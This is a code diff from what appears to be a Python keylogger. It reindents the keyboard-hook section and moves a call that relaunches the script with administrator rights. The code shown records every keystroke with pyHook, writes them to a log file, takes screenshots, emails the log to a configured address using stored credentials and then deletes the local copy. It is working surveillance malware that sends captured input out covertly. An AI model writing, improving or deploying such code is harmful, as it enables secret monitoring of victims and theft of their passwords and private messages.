@@ -191,14 +191,17 @@ try:
           send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
           os.remove(log_file)        
 
-    hooks_manager = pyHook.HookManager()
-    hooks_manager.KeyDown = OnKeyboardEvent
-    hooks_manager.HookKeyboard()
-    pythoncom.PumpMessages()  
-    screenshot()
+      hooks_manager = pyHook.HookManager()
+      hooks_manager.KeyDown = OnKeyboardEvent
+      hooks_manager.HookKeyboard()
+      pythoncom.PumpMessages()  
+      screenshot()
 
       # Code of your program here
     else:
+      # Re-run the program with admin rights
+      ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None,1)
+      
       def OnKeyboardEvent(event):
         fob=open(log_file,"a")
         fob.write(event.Key)
@@ -210,13 +213,11 @@ try:
           send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
           os.remove(log_file)        
 
-    hooks_manager = pyHook.HookManager()
-    hooks_manager.KeyDown = OnKeyboardEvent
-    hooks_manager.HookKeyboard()
-    pythoncom.PumpMessages()  
-    screenshot()
-      # Re-run the program with admin rights
-      ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None,1)
+      hooks_manager = pyHook.HookManager()
+      hooks_manager.KeyDown = OnKeyboardEvent
+      hooks_manager.HookKeyboard()
+      pythoncom.PumpMessages()  
+      screenshot()      
     
 except(KeyboardInterrupt):
   print("Sorry Not Day")
